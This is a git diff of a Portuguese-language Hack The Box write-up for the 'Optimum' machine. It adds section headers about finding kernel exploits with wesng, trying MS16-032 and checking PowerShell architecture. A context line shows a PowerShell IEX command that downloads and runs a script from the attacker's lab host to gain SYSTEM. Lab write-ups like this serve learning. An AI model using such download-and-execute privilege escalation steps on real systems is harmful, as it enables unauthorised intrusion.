@@ -95,6 +95,7 @@ Usando o **systeminfo** pegamos a informacoes sobre o sistema operacional e em s
 
 Depois de estarmos com essas informacoes em nosso localhost, usaremos o https://github.com/bitsadmin/wesng/ para verificar se existe alguma exploracao.
 
+## Find Kernel Exploits Method 1
 ```
 root@kali:~/HTB-Windows/optimum# python /opt/windowsPrivEsc/wesng/wes.py --update
 Windows Exploit Suggester 0.98 ( https://github.com/bitsadmin/wesng/ )
@@ -1331,6 +1332,8 @@ Encontrei mais informacoes interessantes
 ```
 Booom, volteiii depois de ter tentado mais outras formas por exemplo **Port Forward** com as portas que tinha encontrado localmente e tentativas de login nesses mesmos servicos tbmm, nao tive muita sorte e muito menos consegui proceguir....
 
+## Find Kernel Exploits Method 2
+
 De volta ao ponto inicial exploit de kernel , divido ter encontrado mais de 50 vulns o wesng nao diz qual o MS*-** APENAS o numero referente ao CVE e isso eu senti difificuldades para procurar exploits mais rapidamentes..
 
 Mas, existe uma outra alternativa tambem funcional e com um output mais maneiro eu achei... 
@@ -1399,6 +1402,8 @@ MS16-075: Security Update for Windows SMB Server (3164038) - Important
 
 ![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/7.jpg)
 
+## MS16-032
+
 Vamos tentar o MS16-032
 
 ```
@@ -1452,5 +1457,18 @@ ass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3
 
 pronto, finalmente SYSTEM!
 
+## Powershell 32 OR 64?
+
+Como saber se sua rev eh 32 ou 64? simples... 
+
+`if($env:PROCESSOR_ARCHITECTURE -eq "x86"){"32-Bit CPU"}Else{"64-Bit CPU"}`
+
+![11.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/11.jpg)
+
+
+
+FLAG ROOT
+
+![12.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/12.jpg)
 
 
